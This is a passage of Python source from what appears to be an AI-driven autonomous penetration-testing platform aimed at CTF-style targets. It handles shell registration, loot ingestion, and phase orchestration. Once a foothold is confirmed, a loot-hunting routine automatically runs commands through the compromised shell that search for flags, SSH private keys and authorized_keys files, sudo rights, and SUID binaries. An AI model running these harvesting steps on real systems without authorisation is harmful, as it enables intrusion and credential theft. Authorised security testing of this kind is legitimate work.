                shell_ids = list(sa._shells.keys())
            except Exception:
                shell_ids = []
            for sid in shell_ids:
                try:
                    await sa.terminate_shell(sid)
                except Exception as _se:
                    logger.warning(
                        "shell_agent.terminate_shell(%s) failed: %s", sid, _se
                    )

    async def _broadcast_raw(self, event: dict) -> None:
        """
        Emit a raw event dict to the WebSocket broadcast system.
        Used by reasoning components which build their own event dicts.

        Improvement #5 — also funnels high-value events
        (``credential_found``, ``shell_obtained``, ``flag_found``,
        ``privesc_success``) into ``notify_pivot_event`` so the reasoning
        loop can pivot mid-iteration without waiting for the next
        decision boundary.
        """
        event_type = "reasoning_event"
        data: dict = {}
        try:
            event_type = event.get("type", "reasoning_event")
            data       = event.get("data", event)
            await self._emit(event_type, data)
        except Exception:
            pass

        # Forensic scan-log mirror — _emit() already logs WebAgent /
        # subagent events.  This catches reasoning_engine / wstg_phase_*
        # events that take the _broadcast_raw path instead.
        try:
            from utils.scan_logger import log_ws_event as _slog_ws
            _slog_ws(self._session_id, event_type, data)
            # Dedicated WSTG stream
            if event_type == "wstg_phase_update":
                from utils.scan_logger import log_wstg_phase as _slog_wstg
                _slog_wstg(self._session_id, data)
        except Exception:
            pass

        # Opportunistic-pivot tap (Improvement #5).
        if event_type in _PIVOT_TRIGGER_EVENTS:
            try:
                await self.notify_pivot_event(event_type, data)
            except Exception:
                pass

    def _merge_raw_outputs(self, raw_outputs: Dict[str, str]) -> None:
        """Merge new raw_outputs into intel AND feed each new blob to
        the exfil pipeline so DoI patterns get a chance to match.

        Replaces the bare ``self._intel['raw_outputs'].update(...)``
        pattern across the 7 phase-merge sites — same merge semantics,
        plus loot ingestion.
        """
        if not raw_outputs or not isinstance(raw_outputs, dict):
            return
        store = self._intel.setdefault("raw_outputs", {})
        for tool_name, blob in raw_outputs.items():
            # Same merge semantic as before — overwrite per tool key
            store[tool_name] = blob
            # Only ingest non-trivial strings
            if blob and isinstance(blob, str) and len(blob) > 20:
                try:
                    self.ingest_loot(blob, source=f"tool:{tool_name}", tool=str(tool_name))
                except Exception:
                    pass

    def ingest_loot(self, output: str, *, source: str = "", tool: str = "",
                    host: Optional[str] = None) -> int:
        """Recommendation #7 — public entry point for loot ingestion.

        Any tool / shell-exec output that might contain harvestable
        data is fed in here.  ExfilPipeline classifies, stages, and
        manifests; we then refresh ``self._intel['loot']`` so the
        lateral primer's gate-checks see the new loot in the next
        decision-engine iteration.

        Returns the number of LootEntry rows produced (0 when the
        pipeline isn't ready or the output had no DoI matches).
        """
        if self._exfil_pipeline is None:
            return 0
        try:
            entries = self._exfil_pipeline.ingest(
                output, source=source, tool=tool,
                host=host or self._target,
            )
            if entries:
                # Refresh the consolidated loot view that the lateral
                # primer's preconditions check.  Keep both the rich
                # entry list (for the report) and the bucketed lateral
                # shape current.
                self._intel["loot"] = self._exfil_pipeline.export_aggregate_loot()
            return len(entries)
        except Exception as exc:
            import logging as _l
            _l.getLogger(__name__).warning(
                "[ingest_loot] failed: %s", exc)
            return 0

    def notify_advisor(self, source: str, text: str, meta: Optional[dict] = None) -> None:
        """Push a NON-BLOCKING advisory from a PARALLEL support agent into the
        operator's advisor queue.

        Support agents (attack-graph chain analysis, a RAG advisor, a lateral
        analyzer) run alongside the operator and use the LLM/KB on their own; this
        is the channel that lets their conclusions reach the operator's reasoning
        WITHOUT blocking its ReAct loop and WITHOUT making them exploitation
        drivers (the operator stays the sole gatekeeper).  The operator drains
        this queue on its advisor cadence (``_consult_advisors``).  The queue is
        created lazily and bounded so a chatty advisor can't grow it without
        limit.  Best-effort — never raises into the caller."""
        try:
            q = getattr(self, "_advisor_queue", None)
            if q is None:
                import asyncio as _aio
                q = _aio.Queue(maxsize=200)
                self._advisor_queue = q
            try:
                q.put_nowait({"source": source, "text": text, "meta": meta or {}})
            except Exception:
                pass   # full queue → drop oldest-style: just skip (advisory only)
        except Exception:
            pass

    async def register_shell(
        self,
        *, source:    str,
        user:         str = "unknown",
        host:         Optional[str] = None,
        method:       str = "",
        evidence:     str = "",
        session_id:   Optional[str] = None,
        rhost:        Optional[str] = None,
        rport:        Optional[int] = None,
        confirmed:    bool = True,
    ) -> bool:
        """Recommendation A — single write site for shell-access state.

        Any caller (master's exploit phase, reasoning-loop, ExploitOrchestrator,
        ListenerManager, ShellManager, manual operator capture) MUST call this
        instead of writing ``self._intel["shell_access"]`` directly.

        On the first **confirmed** registration this:

        * flips ``intel["shell_access"] = True`` and records the user
        * appends an ``attack_path`` step
        * emits ``shell_obtained`` (routes through ``notify_pivot_event`` so the
          reasoning loop can pivot mid-iteration without waiting for the next
          decision boundary)
        * fires ``plan_step_update`` so the dashboard shows "exploit done"
        * stores a success-memory entry for cross-engagement learning

        ``confirmed`` semantics
        -----------------------
        Optimistic callers — listener spawn, ssh-process-spawn before auth
        succeeded — pass ``confirmed=False``.  We still record the pending
        session entry in ``intel['shells']`` so the operator UI can attach,
        but we do **not** flip ``shell_access`` and we do **not** fire the
        post-exploit / privesc / lateral phases.  Those phases only run
        when at least one *real* foothold exists.

        Confirmed callers (real foothold):
          * ListenerManager.wait_for_session — saw a callback signature
            (uid=, $/# prompt, Meterpreter session N opened)
          * ExploitOrchestrator — subagent reported shell_obtained=True
          * shell_agent.connect_ssh — SSH session reached interactive prompt
          * Manual operator capture via UI

        Auto-detection fallback: if ``confirmed`` is left at its default
        (True) but the evidence contains nothing that looks like real shell
        output (no uid=, no prompt, no session-opened banner), and the
        source is one of the well-known optimistic sources, we downgrade
        to confirmed=False internally.  This prevents legacy callers from
        silently flipping the post-ex gate.

        Subsequent calls are idempotent: they update ``current_user`` if a
        more privileged user is reported (e.g. SYSTEM beats www-data), and
        always append a new ``attack_path`` entry so the timeline shows
        the lateral / privesc progression.  Returns True on first
        confirmed foothold, False on optimistic / subsequent updates.
        """
        import re as _re
        host = host or self._target or ""

        # ── Optimistic-source auto-downgrade ──────────────────────────
        # These sources fire BEFORE a real callback / auth-success has
        # been observed.  Even if the caller passed confirmed=True, treat
        # them as optimistic unless evidence proves otherwise.
        _OPTIMISTIC_SOURCES = {
            "shell_agent:listener",   # listener spawn — no callback yet
            "shell_agent:ssh",        # SSH process spawn — pre-auth
        }
        # Subagent sources that often LLM-hallucinate `shell_obtained: True`
        # without real evidence.  Listed here so the evidence-regex check
        # below acts as the actual gate — real exploit captures (msfconsole
        # `Meterpreter session N opened`, `uid=…`, prompt regex) pass; bare
        # claims like "shell obtained via SQLi" with no prompt evidence get
        # downgraded.
        _OPTIMISTIC_SOURCE_PREFIXES = (
            "subagent:",      # any phase subagent
            "exploit_orchestrator:",
            "web_exploit:",
            "credential_spray:",
            "exploit_synth",  # Tier-2 LLM synthesis — must show real shell evidence,
            "exploit_lab",    # not a self-declared "success" string / web-enum output
        )
        if any(source.startswith(p) for p in _OPTIMISTIC_SOURCE_PREFIXES):
            _OPTIMISTIC_SOURCES = _OPTIMISTIC_SOURCES | {source}
        # A "real foothold evidence" pattern is any of:
        #   uid=N(name)   →  Linux/Unix id output
        #   user@host:~$  →  shell prompt
        #   PS C:\>       →  PowerShell prompt
        #   Pwn3d!        →  CrackMapExec admin marker
        #   Meterpreter session N opened
        #   Command shell session N opened
        _REAL_SHELL_RE = _re.compile(
            r"(?:uid=\d+\(|"
            r"[\w.-]+@[\w.-]+:[^\n]{0,30}[#$]|"
            r"PS\s+[A-Z]:\\|"
            r"Pwn3d!|"
            r"Meterpreter session\s+\d+\s+opened|"
            r"Command shell session\s+\d+\s+opened)",
            _re.I,
        )
        if confirmed and source in _OPTIMISTIC_SOURCES:
            if not _REAL_SHELL_RE.search(evidence or ""):
                confirmed = False

        was_first = not self._intel.get("shell_access")

        # Privilege ordering for upgrades.
        priv_rank = {
            "system": 100, "nt authority\\system": 100, "root": 100,
            "administrator": 90, "admin": 80, "domain admin": 95,
        }
        prev_user = (self._intel.get("current_user") or "").lower()
        new_user_low = (user or "").lower()
        # Don't overwrite a real user with "unknown" from an optimistic call.
        if confirmed and (was_first or priv_rank.get(new_user_low, 50) >= priv_rank.get(prev_user, 0)):
            self._intel["current_user"] = user or "unknown"

        # Record optimistic / pending session in shells[] regardless, so the
        # UI shell-attach surface can list them; only the gate flag is gated.
        if not confirmed:
            self._intel.setdefault("shells", []).append({
                "session_id": session_id or "",
                "user":       user or "unknown",
                "host":       host,
                "method":     method,
                "rhost":      rhost,
                "rport":      rport,
                "ts":         datetime.utcnow().isoformat(),
                "pending":    True,
                "source":     source,
            })
            try:
                import logging as _log
                _log.getLogger(__name__).info(
                    "[register_shell] OPTIMISTIC (no-flip) source=%s user=%s host=%s — "
                    "post-ex/privesc will not fire on this call",
                    source, user, host,
                )
            except Exception:
                pass
            return False  # not a confirmed foothold

        self._intel["shell_access"] = True
        self._intel.setdefault("attack_path", []).append({
            "phase":  "exploit" if was_first else "post_exploit",
            "result": f"Shell as {user} on {host}{(' via ' + method) if method else ''}",
            "source": source,
            "ts":     datetime.utcnow().isoformat(),
        })

        # B-8 — Track session list for ListenerManager + ShellManager surface.
        # If a previous optimistic registration already added a `pending`
        # entry for this same session_id, UPGRADE that entry in place
        # instead of appending a duplicate.  This keeps intel['shells']
        # bounded across many capture/release cycles and gives the UI a
        # single canonical row per shell.
        if session_id or rhost:
            shells_list = self._intel.setdefault("shells", [])
            entry_new = {
                "session_id": session_id or "",
                "user":       user,
                "host":       host,
                "rhost":      rhost or host,
                "rport":      rport,
                "source":     source,
                "method":     method,
                "ts":         datetime.utcnow().isoformat(),
                "pending":    False,    # explicit — confirmed
            }
            upgraded = False
            if session_id:
                for i, ex in enumerate(shells_list):
                    if isinstance(ex, dict) and ex.get("session_id") == session_id:
                        # Preserve the original timestamp (when listener
                        # spawned), update everything else to the
                        # confirmed view.
                        entry_new["ts"] = ex.get("ts") or entry_new["ts"]
                        shells_list[i] = entry_new
                        upgraded = True
                        break
            if not upgraded:
                shells_list.append(entry_new)

        # Best-effort logging — never block the foothold registration.
        try:
            await self._emit("shell_obtained", {
                "scan_id":    self._session_id,
                "session_id": self._session_id,
                "user":       user,
                "host":       host,
                "rhost":      rhost or host,
                "rport":      rport,
                "source":     source,
                "method":     method,
                "evidence":   (evidence or "")[:600],
                "ts":         datetime.utcnow().isoformat(),
            })
        except Exception:
            pass

        if was_first:
            try:
                await self._emit("plan_step_update", {
                    "step_id": "exploit",
                    "status":  "done",
                    "result":  f"Shell obtained as {user} via {source}",
                    "detail":  (evidence or method)[:200],
                    "found":   True,
                    "ts":      datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

            # Cross-engagement memory.
            try:
                await self._store_success_memory("shell_obtained", {
                    "os":       self._intel.get("os_guess", "?"),
                    "services": _fmt_svcs(self._intel.get("services", {}))[:200],
                    "method":   method or source,
                    "user":     user,
                }, ["exploit", "shell", self._intel.get("os_guess", "unknown").lower()])
            except Exception:
                pass

            # Tap pivot logic — lets reasoning loop fire post-ex / privesc
            # phases immediately without waiting for the iteration boundary.
            try:
                await self.notify_pivot_event("shell_obtained", {
                    "user":   user,
                    "host":   host,
                    "rhost":  rhost or host,
                    "rport":  rport,
                    "source": source,
                })
            except Exception:
                pass

            # ── LOOT + FLAG HUNTER (user directive) ─────────────────
            # The moment a shell is confirmed, fire the loot/flag
            # hunting playbook.  Re-evaluating the finding-triggers now
            # (shell_access just flipped True) makes the
            # `loot_and_flag_hunter` trigger fire — its shell_exec
            # commands run THROUGH the active shell, hunting flags,
            # SSH keys, creds, sudo rights and SUID binaries.
            try:
                await self._dispatch_loot_and_flag_hunt(host)
            except Exception as _loot_err:
                import logging as _ll
                _ll.getLogger(__name__).warning(
                    "[loot_hunter] dispatch failed (non-fatal): %s", _loot_err
                )

        return was_first

    async def _dispatch_loot_and_flag_hunt(self, host: str) -> None:
        """Run the loot/flag hunting playbook through the active shell.

        Triggered automatically by register_shell the instant a
        foothold is confirmed.  Pulls the `loot_and_flag_hunter`
        trigger's shell_exec commands and dispatches each one through
        the active shell session.  Captures any flag/credential
        discovered into intel so the win-condition tracker + UI see it.
        """
        if not _FT_AVAILABLE or _ft is None or self._context is None:
            return
        await self.emit_reasoning(
            step       = "loot_flag_hunt",
            reasoning  = (
                f"Shell confirmed on {host} — dispatching loot + flag "
                f"hunting playbook (flags, SSH keys, credentials, sudo "
                f"rights, SUID binaries) through the active shell."
            ),
            decision   = "HUNT LOOT + FLAGS",
            next_action= "Execute post-foothold loot commands on the target",
        )
        try:
            actions = _ft.evaluate_triggers(self._context)
        except Exception:
            actions = []
        loot_cmds = [
            a.payload for a in actions
            if a.kind == "command" and a.payload.startswith("shell_exec")
        ]
        # Fallback: if the trigger didn't yield (already fired), use a
        # built-in minimal flag+loot set so we ALWAYS hunt on foothold.
        if not loot_cmds:
            loot_cmds = [
                "shell_exec find / -type f \\( -name user.txt -o -name root.txt -o -name flag.txt \\) 2>/dev/null",
                "shell_exec id; sudo -n -l 2>/dev/null",
                "shell_exec find / -perm -4000 -type f 2>/dev/null | head -40",
                "shell_exec find / -name id_rsa -o -name authorized_keys 2>/dev/null | head -20",
            ]
        for cmd in loot_cmds[:10]:
            if self._stop_requested:
                break
            try:
                out = await self._dispatch_to_agent(
                    tool="shell_exec",
                    args=cmd.replace("shell_exec", "", 1).strip(),
                    purpose="Loot + flag hunt through active shell",
                    phase="post_exploit",
                    timeout=60,
                )
                # Capture flags from output
                self._capture_flags_from_output(
                    out.get("stdout", "") if isinstance(out, dict) else str(out)
                )
            except Exception:
                continue

    def _capture_flags_from_output(self, text: str) -> None:
        """Extract HTB/THM-style flags from command output into intel."""
        if not text:
            return
        import re as _re
        # HTB/THM flag formats: 32-hex user/root flags, HTB{...}, flag{...}
        patterns = [
            r"\bHTB\{[^}]{4,}\}",
            r"\bflag\{[^}]{4,}\}",
            r"\bTHM\{[^}]{4,}\}",
            r"\b[0-9a-f]{32}\b",
        ]
        for pat in patterns:
            for m in _re.findall(pat, text):
                # Heuristic: 32-hex only counts if the line mentions a flag file
                if pat.endswith("{32}") and "txt" not in text.lower() and "flag" not in text.lower():
                    continue
                if "user" in text.lower() and not self._intel.get("user_flag"):
                    self._intel["user_flag"] = m
                elif "root" in text.lower() and not self._intel.get("root_flag"):
                    self._intel["root_flag"] = m

    async def notify_pivot_event(self, event_type: str, payload: Any) -> None:
        """Public hook called when a high-value engagement event fires.

        Subagents and the reasoning loop both call this when a credential is
        captured, a shell drops, a flag is read, or privesc succeeds.  The
        master forwards the event to the active ``ReasoningLoop`` (if any)
        which calls ``_consider_pivots()`` immediately under a lock — this
        unblocks lateral movement / privesc / post-exploit phases the moment
        the triggering evidence is in intel, instead of waiting for the
        action loop to come back around.

        Idempotency: each (event_type, signature) tuple is processed at most
        once per session.  ``signature`` is derived from the payload so that
        duplicate emissions of the same credential do not re-fire pivots.
        """
        sig = _pivot_signature(event_type, payload)
        key = (event_type, sig)
        if key in self._pivot_seen:
            return
        self._pivot_seen.add(key)

        loop_inst = getattr(self, "_reasoning_loop_inst", None)
        if loop_inst is None or not hasattr(loop_inst, "on_pivot_event"):
            return

        # Lazy-init the lock in case __init__ ran in a non-async context.
        if self._pivot_lock is None:
            self._pivot_lock = asyncio.Lock()
        async with self._pivot_lock:
            try:
                await loop_inst.on_pivot_event(event_type, payload)
            except Exception:
                pass

    async def _db_update_hypothesis(
        self,
        session_id:    str,
        hypothesis_id: str,
        validated:     bool  = None,
        invalidated:   bool  = None,
        confidence:    float = None,
    ) -> None:
        """Update hypothesis status in MongoDB. Called by ReasoningLoop._update()."""
        try:
            await db.update_hypothesis_status(
                session_id    = session_id,
                hypothesis_id = hypothesis_id,
                validated     = validated,
                invalidated   = invalidated,
                confidence    = confidence,
            )
        except Exception:
            pass

    async def _execute_phases(
        self,
        session_id:   str,
        target:       str,
        plan:         Dict,
        resume_from:  Optional[str] = None
    ):
        """
        Execute all enabled phases driven by the state machine.
        Phases 1-4 (recon/vuln/web/osint) run IN PARALLEL for speed.
        Attack planning runs after intelligence aggregation.

        resume_from: if set, skip every phase that appears in _phases_completed
                     until we reach the phase AFTER resume_from.

        Phase 5: when use_reasoning_loop=True, delegates to _reasoning_loop_run()
        which replaces linear phase execution with hypothesis-driven evidence loop.
        """
        # ── REASONING LOOP ROUTING ──────────────────────────────────────────
        # When the reasoning engine is enabled, skip the linear phase executor
        # and use the hypothesis-driven loop instead.
        # Default (use_reasoning_loop=False) runs the original code unchanged.
        if self._use_reasoning_loop and _REASONING_AVAILABLE:
            # ── Parse operator context via LLM (replaces regex CTF parser) ──
            # Only parse if notes or scope provided and not already parsed
            if not self._intel.get("engagement_context"):
                ctx = await self._parse_operator_context(
                    notes       = self._notes,
                    scope       = self._scope,
                    target_type = self._target_type,
                )
                self._intel["engagement_context"] = ctx.to_dict()
                # Back-compat: also populate ctf_objectives/ctf_answers for
                # any code that still reads those keys
                if ctx.has_objectives:
                    self._intel["ctf_objectives"] = ctx.objectives
                    self._intel.setdefault("ctf_answers", {})
                # Broadcast context to frontend so dashboards know the type
                await self._emit("engagement_context", {
                    "engagement_type":     ctx.engagement_type,
                    "title":               ctx.title,
                    "context_summary":     ctx.context_summary,
                    "objectives_count":    len(ctx.objectives),
                    "approach_summary":    ctx.approach_summary,
                    "clarifying_questions": ctx.clarifying_questions,
                })
                # If LLM needs clarification, ask the operator without blocking
                if ctx.needs_clarification:
                    await self._emit("operator_question", {
                        "questions":       ctx.clarifying_questions,
                        "context_so_far":  ctx.context_summary,
                        "engagement_type": ctx.engagement_type,
                        "note":            "Scan is proceeding with best-guess assumptions. Answer to improve accuracy.",
                    })

            await self._init_reasoning_components(session_id, target)
            await self._reasoning_loop_run(session_id, target, plan, resume_from)

            # ── B-4: REPORT GENERATION IN DEFAULT (REASONING-LOOP) MODE ─────
            # CRITICAL: when use_reasoning_loop=True (the default) the
            # original linear executor below was bypassed via `return`.
            # That meant `_phase_evidence_collection` and `_phase_reporting`
            # NEVER ran in default mode — the platform completed scans
            # without ever generating a report.  We now invoke evidence
            # collection + report generation explicitly after the
            # reasoning loop exits.  Both calls are wrapped with
            # try/except so a broken report generator can't poison the
            # session-end teardown / DB updates.
            try:
                await self._wait_for_agents_idle(timeout=120.0)
            except Exception:
                pass
            # ── COMPROMISE-READINESS GATE ───────────────────────────────
            # ARGUS exists to COMPROMISE, not to file a CVE list.  If the run
            # achieved no shell / flag / harvested creds / verified exploit,
            # force ONE final genuine exploitation pass before reporting.
            try:
                await self._final_compromise_gate(session_id, target)
            except Exception:
                pass
            try:
                await self._phase_evidence_collection(session_id, target)
            except Exception as _ec_err:
                import logging as _l
                _l.getLogger(__name__).warning(
                    "evidence_collection failed (non-fatal): %s", _ec_err
                )
            try:
                await self._emit("plan_step_update", {
                    "step_id": "reporting", "status": "active",
                    "result":  "Generating penetration test report",
                    "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
                })
                await self._transition_state("REPORT_GENERATION")
                await self._phase_reporting(session_id, target)
                await self._emit("plan_step_update", {
                    "step_id": "reporting", "status": "done",
                    "result":  "Penetration test report ready",
                    "detail":  f"Findings: {self._intel.get('findingsSummary',{})}",
                    "found":   True, "ts": datetime.utcnow().isoformat()
                })
                await self._transition_state("COMPLETE")
            except Exception as _r_err:
                import logging as _l
                _l.getLogger(__name__).warning(
                    "report generation failed (non-fatal): %s", _r_err
                )
            return
        # ── END REASONING LOOP ROUTING ──────────────────────────────────────
        phases = self._phases_to_run

        def phase_enabled(p: str) -> bool:
            if not phases:
                return True
            if p in phases:
                return True
            try:
                return AttackPhase(p) in phases or p.upper() in [str(ph).upper() for ph in phases]
            except (ValueError, KeyError):
                return False

        def already_done(p: str) -> bool:
            """True if this phase was completed before this resume."""
            return p in self._phases_completed

        # ── Background guidance drain task ────────────────────
        # Processes guidance within 2 s regardless of LLM/DB latency in main flow.
        _drain_task = asyncio.create_task(self._guidance_drain_loop())

        # ── Pull long-term memories relevant to this target ───
        await self._transition_state("RECON")
        mem_ctx = await self._recall_relevant_memories(
            target_type = self._intel.get("target_type", "unknown"),
            tags        = ["recon", "initial_access", plan.get("assessment_type", "")]
        )
        if mem_ctx:
            self._intel.setdefault("operator_notes", []).append({
                "note": f"Long-term memory context loaded for {self._intel.get('target_type','?')} targets",
                "ts":   datetime.utcnow().isoformat()
            })
            await self.emit_reasoning(
                step       = "memory_loaded",
                reasoning  = "Retrieved relevant patterns from previous engagements",
                decision   = f"Loaded {len(self._intel['long_term_hits'])} memories",
                next_action= "Inject memory context into planning prompts"
            )

        # ── PHASE 1: RECON (always first, sequential) ─────────
        await self._apply_pending_guidance()   # drain any queued guidance before recon
        if phase_enabled("recon") and not already_done("recon"):
            await self._phase_recon(target, plan)
            self._phases_completed.append("recon")
            await self._drain_pending_corrections("recon")
        elif already_done("recon"):
            await self.emit_reasoning(
                step="recon_skipped", reasoning="Recon already completed before pause",
                decision="Skipping recon phase", next_action="Continue from next phase"
            )

        # ── AUTO-CHECKPOINT 1: after recon ────────────────────
        await self._check_pause("recon")

        # ── Spawn the reactive entry-attempt dispatcher ─────────────
        # Long-running parallel task that fires exploit attempts the
        # MOMENT a viable entry point appears in intel, without
        # blocking the main phase pipeline.  Lives for the entire
        # engagement or until post_exploit / complete mode.
        if _EC_AVAILABLE and self._context is not None:
            try:
                _entry_task = asyncio.create_task(
                    self._entry_attempt_dispatcher(target)
                )
                self._background_tasks.append(_entry_task)
                await self.emit_reasoning(
                    step       = "entry_dispatcher_started",
                    reasoning  = (
                        "Reactive entry-attempt dispatcher started.  Runs in "
                        "parallel with the phase pipeline; fires exploit "
                        "attempts the moment a viable entry point is detected "
                        "in intel.  When entry succeeds, engagement pivots to "
                        "post_exploit mode and all scanning yields."
                    ),
                    decision   = "DISPATCHER READY",
                    next_action= "Continue phase pipeline; dispatcher reacts in background",
                )
            except Exception as _disp_err:
                import logging as _ll
                _ll.getLogger(__name__).warning(
                    "[entry_dispatcher] startup failed (non-fatal): %s",
                    _disp_err,
                )

        # ── Spawn the Error Analyzer agent (NEW) ─────────────────────
        # Subscribes to tool errors emitted by collect_tool and runs
        # LLM-driven triage on each unique error.  Without it the
        # system blindly re-tries the same broken command (e.g. 1,292
        # curls against the wrong port).
        try:
            from agents.meta.error_analyzer_agent import (
                ErrorAnalyzerAgent, register_analyzer,
            )
            try:
                _ea_db = db.get_db()
            except Exception:
                _ea_db = None
            self._error_analyzer = ErrorAnalyzerAgent(
                broadcast  = self.broadcast,
                session_id = session_id,
                db_conn    = _ea_db,
                enabled    = True,
            )
            register_analyzer(self._error_analyzer)
            _err_task = asyncio.create_task(self._error_analyzer.run())
            self._background_tasks.append(_err_task)
            await self.emit_reasoning(
                step       = "error_analyzer_started",
                reasoning  = (
                    "Error Analyzer agent started.  Every tool error is "
                    "classified by the LLM (transient / wrong_target / "
                    "tool_missing / bad_args / unsupported / scope_drift) "
                    "and a course correction is pinned on the engagement "
                    "context — so the platform stops looping on dead ends."
                ),
                decision   = "ERROR ANALYZER READY",
                next_action= "Errors will be triaged in real time",
            )
        except Exception as _err_init:
            import logging as _ll
            _ll.getLogger(__name__).warning(
                "[error_analyzer] startup failed (non-fatal): %s", _err_init,
            )
            self._error_analyzer = None

        # ── Target profile classification (genuinely different fix) ──
        # Now that RECON has discovered ports/services, classify what
        # KIND of target this is.  Profile drives whether WSTG runs,
        # whether the AD chain triggers, etc.  In the support.htb run
        # this would have classified the target as ad_dc and skipped
        # the 14-phase WSTG playbook (which wasted ~90 minutes hammering
        # port 80 on a Domain Controller that has no web app surface).
        if _EC_AVAILABLE and self._context is not None:
            try:
                profile = self._context.commit_target_profile()
                await self.emit_reasoning(
                    step       = "target_profile_classified",
                    reasoning  = (
                        f"Recon discovered {len(self._intel.get('open_ports', []))} "
                        f"open ports.  Target profile classified as: {profile!r}.  "
                        f"Phase router will skip irrelevant playbooks."
                    ),
                    decision   = f"TARGET PROFILE = {profile}",
                    next_action= "Dispatch profile-appropriate intel phases",
                )
            except Exception as _profile_err:
                import logging as _ll
                _ll.getLogger(__name__).warning(
                    "[target_profile] classification failed (non-fatal): %s",
                    _profile_err,
                )

        # ── PHASE 2: PARALLEL intelligence gathering ──────────
        # Run vuln scan + web testing + OSINT simultaneously
        await self._apply_pending_guidance()   # drain before parallel phase starts
        await self._transition_state("INTELLIGENCE_AGGREGATION")

        parallel_coros = []
        if (phase_enabled("vuln_id") or phase_enabled("scan")) and not already_done("vuln_id"):
            parallel_coros.append(("vuln", self._phase_vuln_id(target)))

        web_ports = []
        _COMMON_WEB_PORTS = {80, 443, 8080, 8443, 8000, 8008, 8888, 3000, 5000, 9000, 8181, 4443, 7443}
        for port, svc in self._intel["services"].items():
            svc_name = (svc.get("service","") if isinstance(svc,dict) else str(svc)).lower()
            svc_banner = (svc.get("banner", "") + " " + svc.get("product", "") + " " + svc.get("version", "")
                            if isinstance(svc, dict) else "").lower()
            # WinRM on 5985 looks like HTTP but is admin-only, not a web
            # app — exclude so we don't waste WSTG cycles on it.
            try:
                port_int = int(str(port).split("/")[0])
            except Exception:
                continue
            if port_int == 5985 and ("httpapi" in svc_banner or "winrm" in svc_banner):
                continue
            is_web_svc = any(x in svc_name for x in ("http", "https", "web", "ssl/http", "http?", "www"))
            is_web_port = port_int in _COMMON_WEB_PORTS
            if is_web_svc or is_web_port:
                web_ports.append(port_int)
        # Deduplicate and sort
        web_ports = sorted(set(web_ports))

        # ── Port-aware refinement (Overpass-3 fix) ─────────────────
        # When the EngagementContext can identify a *primary* web port
        # via service-banner heuristics, narrow the list to that one
        # port.  This stops WSTG from spending 27 minutes hitting port
        # 80 (closed) while the actual Werkzeug app is on 8080.
        try:
            if self._context is not None:
                primary = self._context.primary_web_port()
                if primary is not None:
                    if primary in web_ports:
                        web_ports = [primary] + [p for p in web_ports if p != primary]
                    else:
                        web_ports = [primary] + web_ports
                    await self.emit_reasoning(
                        step       = "web_port_focus",
                        reasoning  = (
                            f"EngagementContext.primary_web_port() identified "
                            f"port {primary} as the real web service.  WSTG "
                            f"will target it first instead of mechanical 80/443."
                        ),
                        decision   = f"WEB FOCUS PORT = {primary}",
                        next_action= "WebOrchestrator will use this port",
                    )
        except Exception:
            pass

        # ── Force web phase for URL/app targets even without port scan ──
        # When the operator gave a URL or app target, port-scan output may
        # not be available yet (or never — for app-only mode the operator
        # explicitly skipped network probes).  Derive web_ports from the
        # URL itself so the web phase still fires.
        if (not web_ports) and self._intel.get("target_url"):
            try:
                from urllib.parse import urlparse as _up
                _u = _up(self._intel["target_url"])
                _port = _u.port or (443 if _u.scheme == "https" else 80)
                web_ports = [int(_port)]
            except Exception:
                web_ports = [443 if str(self._intel.get("target_url","")).startswith("https") else 80]

        # When kind=hostname/url/app, also force the standard ports if no
        # other web ports detected — mass scanners + WAFs sometimes hide
        # the actual service behind 80/443 on hosts that don't expose
        # other classic ports.
        if (not web_ports) and self._intel.get("target_kind") in ("hostname", "url", "app"):
            web_ports = [80, 443]

        if web_ports and not already_done("web_testing"):
            parallel_coros.append(("web", self._phase_web_testing(target, web_ports)))

        if phase_enabled("osint") and not already_done("osint"):
            parallel_coros.append(("osint", self._phase_osint(target)))

        # ── Optional specialist phases run alongside vuln/web/osint ──
        # Cloud: if cloud metadata port (80/443) or IMDS hints in scan results
        _svcs_str = _fmt_svcs(self._intel.get("services", {})).lower()
        _os_str   = self._intel.get("os_guess", "").lower()
        if phase_enabled("cloud") and not already_done("cloud") and (
            "169.254.169.254" in str(self._intel) or
            any(k in _svcs_str for k in ("aws", "azure", "gcp", "cloud", "metadata")) or
            self._intel.get("target_type", "") in ("cloud", "aws", "azure", "gcp")
        ):
            parallel_coros.append(("cloud", self._phase_cloud(target)))

        # Container: if docker (2375/2376) or k8s (6443/8443/10250) ports open
        _open_ports = set(str(p) for p in self._intel.get("open_ports", []))
        if phase_enabled("container") and not already_done("container") and (
            _open_ports & {"2375", "2376", "6443", "8443", "10250", "10255"} or
            any(k in _svcs_str for k in ("docker", "kubernetes", "k8s"))
        ):
            parallel_coros.append(("container", self._phase_container(target)))

        # Traffic: passive capture runs alongside other recon phases
        if phase_enabled("traffic") and not already_done("traffic"):
            parallel_coros.append(("traffic", self._phase_traffic(target)))

        if parallel_coros:
            phase_names = ', '.join(n for n, _ in parallel_coros)
            await self.emit_reasoning(
                step       = "parallel_intel",
                reasoning  = f"Master dispatching {len(parallel_coros)} agents simultaneously: {phase_names}",
                decision   = f"Parallel execution: {phase_names}",
                next_action= "All agents execute concurrently — Master waits for all results"
            )
            # Broadcast parallel start event so UI shows all agents active
            await self._emit("parallel_intel", {
                "agents":  [n for n, _ in parallel_coros],
                "decision": f"Running in parallel: {phase_names}",
                "next_action": "Agents executing simultaneously"
            })
            # Run all simultaneously — exceptions caught individually
            results = await asyncio.gather(
                *[coro for _, coro in parallel_coros],
                return_exceptions=True
            )
            for (name, _), result in zip(parallel_coros, results):
                if isinstance(result, Exception):
                    await self.emit_reasoning(
                        step       = f"parallel_{name}_error",
                        reasoning  = f"{name} agent error: {result}",
                        decision   = "Continuing with remaining agents",
                        next_action= "Use available intel for planning"
                    )
                else:
                    if name not in self._phases_completed:
                        self._phases_completed.append(name)
            await self.emit_reasoning(
                step       = "parallel_intel_done",
                reasoning  = f"All {len(parallel_coros)} parallel agents completed",
                decision   = "Aggregating results from all agents",
                next_action= "Master analyzes combined intelligence"
            )

            # Sync gate: ensure all parallel agents are truly done before continuing
            await self._wait_for_agents_idle(timeout=120.0)

            await self._drain_pending_corrections("intelligence_aggregation")

        # ── AUTO-CHECKPOINT 2: after parallel intel ───────────
        await self._check_pause("parallel_intel")

        # Capture all enumeration as evidence
        if self._intel.get("open_ports"):
            await self._capture_evidence(
                phase        = "recon",
                evidence_type= "command_transcript",
                title        = f"Port scan results — {len(self._intel['open_ports'])} ports open",
